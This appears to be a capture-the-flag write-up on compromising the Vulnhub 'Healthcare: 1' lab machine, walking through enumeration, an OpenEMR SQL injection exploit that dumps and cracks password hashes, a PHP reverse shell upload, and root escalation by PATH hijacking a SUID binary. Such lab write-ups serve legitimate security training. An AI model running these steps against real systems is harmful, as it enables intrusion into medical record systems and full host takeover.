---
layout: post
title: 'Healthcare: 1 - Vulnhub'
date: 2022-09-08 15:35 +0300
categories: [Cybersecurity, CTF Challenges]
tags: [ctf]
---






This post outlines the steps that were taken to fully compromise the "Healthcare: 1" host from Vulnhub.

## Nmap Results

```bash
# Nmap 7.92 scan initiated Thu Jul 21 17:51:49 2022 as: nmap -T5 -p- -oA scan 10.9.9.56
Nmap scan report for 10.9.9.56
Host is up (0.00033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

# Nmap done at Thu Jul 21 17:51:51 2022 -- 1 IP address (1 host up) scanned in 1.99 seconds
```

## Service Enumeration

### TCP/80

![](../../assets/img/vulnhub/health1.png)

### robots.txt

```bash
# $Id: robots.txt 410967 2009-08-06 19:44:54Z oden $
# $HeadURL: svn+ssh://svn.mandriva.com/svn/packages/cooker/apache-conf/current/SOURCES/robots.txt $
# exclude help system from robots
User-agent: *
Disallow: /manual/
Disallow: /manual-2.2/
Disallow: /addon-modules/
Disallow: /doc/
Disallow: /images/
# the next line is a spam bot trap, for grepping the logs. you should _really_ change this to something else...
Disallow: /all_our_e-mail_addresses
# same idea here...
Disallow: /admin/
# but allow htdig to index our doc-tree
#User-agent: htdig
#Disallow:
# disallow stress test
user-agent: stress-agent
Disallow: /
```

## Web Enumeration

Begin by examining the paths listed in robots.txt, with particular attention to /addon-modules. Although this path appears legitimate, it can only be accessed from the localhost address, while all others return a 404 error. To further explore potential paths, consider using gobuster enumeration on the site's root:

```bash
gobuster dir -u http://10.9.9.56/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html -t 200 -o gobuster.txt -r

/index                (Status: 200) [Size: 5031]
/index.html           (Status: 200) [Size: 5031]
/images               (Status: 403) [Size: 1009]
/css                  (Status: 403) [Size: 1009]
/js                   (Status: 403) [Size: 1009]
/robots               (Status: 200) [Size: 620]
/vendor               (Status: 403) [Size: 1009]
/favicon              (Status: 200) [Size: 1406]
/fonts                (Status: 403) [Size: 1009]
/gitweb               (Status: 403) [Size: 1009]
/phpMyAdmin           (Status: 403) [Size: 59]
/server-status        (Status: 403) [Size: 995]
/server-info          (Status: 403) [Size: 995]
/openemr              (Status: 200) [Size: 131]
```

Upon reviewing the findings, the /openemr resource immediately catches my attention.

![](../../assets/img/vulnhub/health2.png)

Based on information from the Exploit Database, it appears that this version of OpenEMR is susceptible to a SQL injection vulnerability.

```bash
searchsploit openemr 4.1.0
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 4.1.0 - 'u' SQL Injection                                                                                                                                              | php/webapps/49742.py
Openemr-4.1.0 - SQL Injection                                                                                                                                                  | php/webapps/17998.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

## Exploit

The script 49742.py is designed to perform an unauthenticated blind SQL injection attack, with the objective of identifying usernames and hashes by comparing sleep duration with character guesses. To execute the exploit, we must modify the variable to include the URL of our target.

```
url = "http://192.168.56.106/openemr/interface/login/validateUser.php?u="
```

Due to the blind nature of this SQL injection, it may take some time to execute.

```bash
python ./49742.py
```

![](../../assets/img/vulnhub/health3.png)

We'll simply collect the hashes and save them in a file, which we can then use John the Ripper to crack.

```
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d
```

```bash
john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt hash

medical          (medical)     
ackbar           (admin)
```

Therefore, the login credentials are:

* admin:ackbar
* medical:medical

Our initial goal is to reexamine the FTP service to determine if the login credentials provide access.

* admin:ackbar doesn't work
* medical:medical works!

![](../../assets/img/vulnhub/health4.png)

We have come across some intriguing files.

* /Documents
* Passwords.txt

After finishing the enumeration of the FTP service, we log in to OpenEMR as admin:ackbar and search for potential opportunities to execute code for a reverse shell.

![](../../assets/img/vulnhub/health5.png)

Within the Administration menu, there exists a Files interface that presents the possibility of either modifying an existing .php file or exploiting the upload feature.
![](../../assets/img/vulnhub/health6.png)

The MIME type is not verified during file upload, allowing us to upload a .php file and navigate to http://10.9.9.56/openemr/sites/default/images/shell.php to obtain a reverse shell on the target. We utilize the traditional PHP reverse shell payload from pentestmonkey.

![](../../assets/img/vulnhub/health7.png)

## Post-Exploit Enumeration

### Current User

`uid=479(apache) gid=416(apache) groups=416(apache)`

sudo binary not installed

## OS & Kernel

```bash
ZEN-mini release 2011 (PCLinuxOS) for i586    
    
Linux localhost.localdomain 2.6.38.8-pclos3.bfs #1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux
```
### Users

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/bin/sh
daemon:x:2:2:daemon:/sbin:/bin/sh
adm:x:3:4:adm:/var/adm:/bin/sh
lp:x:4:7:lp:/var/spool/lpd:/bin/sh
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/bin/sh
news:x:9:13:news:/var/spool/news:/bin/sh
uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
operator:x:11:0:operator:/var:/bin/sh
games:x:12:100:games:/usr/games:/bin/sh
nobody:x:65534:65534:Nobody:/:/bin/sh
rpm:x:499:499:system user for rpm:/var/lib/rpm:/bin/false
avahi:x:498:498:system user for avahi:/var/avahi:/bin/false
avahi-autoipd:x:497:497:system user for avahi:/var/avahi:/bin/false
messagebus:x:496:496:system user for dbus:/:/sbin/nologin
haldaemon:x:495:495:system user for hal:/:/sbin/nologin
vcsa:x:69:494:virtual console memory owner:/dev:/sbin/nologin
polkituser:x:494:490:system user for policykit:/:/sbin/nologin
uuidd:x:493:489:system user for util-linux-ng:/var/lib/libuuid:/bin/false
mysql:x:492:488:system user for mysql:/var/lib/mysql:/bin/bash
sshd:x:491:485:system user for openssh:/var/empty:/bin/true
rtkit:x:489:483:system user for rtkit:/proc:/sbin/nologin
rpc:x:488:482:system user for rpcbind:/var/lib/lib/rpcbind:/sbin/nologin
rpcuser:x:487:481:system user for nfs-utils:/var/lib/lib/nfs:/bin/false
ntp:x:486:480:system user for ntp:/etc/ntp:/bin/false
xfs:x:485:479:system user for xfs:/etc/X11/fs:/bin/false
saned:x:484:478:system user for saned:/home/saned:/bin/false
squid:x:483:420:system user for squid:/var/spool/squid:/bin/false
dansguardian:x:482:419:system user for dansguardian:/var/lib/dansguardian:/bin/false
gdm:x:481:418:system user for gdm:/var/lib/gdm:/bin/false
usbmux:x:480:417:system user for usbmuxd:/proc:/sbin/nologin
medical:x:500:500:PCLinuxOS Medical:/home/medical:/bin/bash
apache:x:479:416:system user for httpd-conf:/var/www:/bin/sh
ftp:x:478:415:system user for proftpd:/var/ftp:/bin/false
almirant:x:501:502:Almirant:/home/almirant:/bin/bash
```

### Groups

```bash
root:x:0:
bin:x:1:
daemon:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:mysql,medical,almirant
mem:x:8:
kmem:x:9:
wheel:x:10:
mail:x:12:
news:x:13:
uucp:x:14:
man:x:15:
floppy:x:19:mysql,medical,almirant
games:x:20:
tape:x:21:
cdrom:x:22:mysql,medical,almirant
utmp:x:24:
shadow:x:25:
chkpwd:x:26:
auth:x:27:
usb:x:43:saned
cdwriter:x:80:mysql,saned,medical,almirant
audio:x:81:mysql,medical,almirant
video:x:82:mysql,medical,almirant
dialout:x:83:mysql,medical,almirant
users:x:100:mysql,medical,almirant
nogroup:x:65534:
rpm:x:499:
avahi:x:498:
avahi-autoipd:x:497:
messagebus:x:496:
haldaemon:x:495:
vcsa:x:494:
xgrp:x:493:
ntools:x:492:
ctools:x:491:
polkituser:x:490:mysql,medical,almirant
uuidd:x:489:
mysql:x:488:
pulse-access:x:487:mysql
slocate:x:486:
sshd:x:485:
rtkit:x:483:
rpc:x:482:
rpcuser:x:481:
ntp:x:480:
xfs:x:479:
saned:x:478:
lpadmin:x:477:mysql
machines:x:421:
squid:x:420:
dansguardian:x:419:
fuse:x:501:mysql,medical
gdm:x:418:
usbmux:x:417:
medical:x:500:
apache:x:416:
ftp:x:415:
almirant:x:502:
```

## Network

### Interfaces

```bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 5e:78:42:6d:7c:fe brd ff:ff:ff:ff:ff:ff
    inet 10.9.9.56/24 brd 10.9.9.255 scope global eth1
    inet6 fe80::5c78:42ff:fe6d:7cfe/64 scope link 
       valid_lft forever preferred_lft forever
```

Open ports

```bash
tcp        0      0 0.0.0.0:21                  0.0.0.0:*                   LISTEN      -                   
tcp        0      0 :::80                       :::*                        LISTEN      -                   
```

### Processes

We haven't discovered anything particularly noteworthy, but it appears that MySQL may be operational. Strangely, we are unable to detect any ports on which it is listening.

### Interesting Files

`/usr/bin/healthcheck`

Custom SUID binary with root owner

`-rwsr-sr-x 1 root root 5813 Jul 29  2020 /usr/bin/healthcheck`

## Privilege Escalation

When conducting post-exploit enumeration on a Linux machine, one fundamental aspect to investigate is SUID files.

`find / -type f -user root -perm /4000 -exec ls -l {} \; 2>/dev/null`

The strings binary is already installed on this target, enabling me to examine the binary and potentially uncover a path injection candidate or comparable exploit:

```bash
strings /usr/bin/healthcheck

/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -
```

This is a simple victory as it is an ideal prospect for $PATH injection. Given that all of these commands are denoted by their relative names and not absolute paths, such as /usr/bin/clear, we can exploit path precedence and obtain a shell as root:

```bash
# Copy the bash binary to /tmp/clear
cp /bin/bash /tmp/clear

# Add /tmp first in path precedence so /tmp/clear resolves first
export PATH=/tmp:$PATH

# Run the binary
/usr/bin/healthcheck
```

By executing the /usr/bin/healthcheck binary, it will function at the `root` user's privilege level within our session, reading binaries from our $PATH environment. We duplicate `/bin/bash` as` /tmp/clear`. Consequently, when `/usr/bin/healthcheck` runs and attempts to activate the clear command, it will resolve clear => `/tmp/clear` instead of `/usr/bin/clear` as we have placed `/tmp` first in our `$PATH` variable.

![](../../assets/img/vulnhub/health8.png)

### Flags

`/home/almirant/user.txt`

>**User**

```
d41d8cd98f00b204e9800998ecf8427e
```


>**Root**

```
root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
```
